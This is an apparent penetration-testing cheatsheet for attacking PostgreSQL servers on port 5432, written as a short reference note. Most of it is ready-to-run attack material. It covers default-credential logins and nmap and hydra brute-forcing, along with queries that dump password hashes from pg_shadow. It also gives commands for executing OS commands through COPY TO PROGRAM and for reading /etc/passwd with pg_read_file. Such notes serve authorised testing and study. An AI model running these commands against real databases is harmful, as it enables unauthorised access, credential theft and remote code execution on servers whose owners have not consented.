---
tags: [pentest, cheatsheet, postgresql, database, service, both]
port: 5432
phase: reference
---
# PostgreSQL (5432)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Postgres. Check default `postgres:postgres` creds. **`COPY TO/FROM PROGRAM`** lets a superuser execute OS commands directly — instant RCE. **Trusted authentication** on localhost (`pg_hba.conf` trust) allows passwordless login from the host itself, so combine with SSRF/LFI to reach 127.0.0.1:5432. **Common attack vectors:** default credentials, COPY command file read/write, COPY ... PROGRAM for RCE, postgres OS command extensions, SQL injection from app layer, large-object file write.

## Connect

```bash
psql -h $IP -U postgres
psql -h $IP -U postgres -d database_name
```

## Enumerate

```bash
nmap -sV -sC -p 5432 $IP
nmap --script pgsql-brute -p 5432 $IP
```

## Key queries

```sql
SELECT version();
SELECT current_user;
\l                      -- list databases
\dt                     -- list tables
SELECT usename, passwd FROM pg_shadow;
```

## Command execution (superuser)

```sql
COPY (SELECT '') TO PROGRAM 'id';
SELECT pg_read_file('/etc/passwd');
```

## Brute-force

```bash
hydra -l postgres -P passwords.txt postgres://$IP
```

> Full details: [[04 - Enumeration/35 - PostgreSQL Enumeration|PostgreSQL Enumeration]]
